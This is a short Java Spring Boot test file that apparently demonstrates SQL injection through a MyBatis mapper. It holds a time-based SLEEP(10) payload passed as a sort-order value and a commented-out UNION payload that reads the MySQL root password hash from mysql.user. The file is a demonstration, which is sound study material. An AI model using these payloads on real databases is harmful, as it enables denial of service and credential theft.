package generator;

import org.junit.jupiter.api.Test;
import org.mybatis.spring.boot.test.autoconfigure.AutoConfigureMybatis;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.autoconfigure.jdbc.AutoConfigureTestDatabase;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.test.context.ActiveProfiles;

import generator.mapper.ArticleTypeMapper;
import lombok.val;

/**
 * MyMybatisTest.
 *
 * @author 刘斌
 * @version 0.0.1
 * @serial 2022-08-09 : base version.
 */
@SpringBootTest
@AutoConfigureMybatis
@ActiveProfiles("dev")
@AutoConfigureTestDatabase(replace = AutoConfigureTestDatabase.Replace.NONE)
public class MyMybatisTest {

    @Autowired
    ArticleTypeMapper articleTypeMapper;

    /**
     * mybatis sql 注入
     */
    @Test
    void testMybatis() {
        // 睡眠10s
        val allOrder = articleTypeMapper.findAllOrder("id", "desc , (SELECT(1) FROM (SELECT(SLEEP(10))) test)");
        System.out.println(allOrder);
        // 获取 mysql 密码
//        val selectRoot = articleTypeMapper.findAllByTable("article_type union  SELECT 10086 AS id, NULL, authentication_string AS typename FROM mysql.user WHERE USER LIKE \"%root%\"");
//        System.out.println(selectRoot);
    }
}
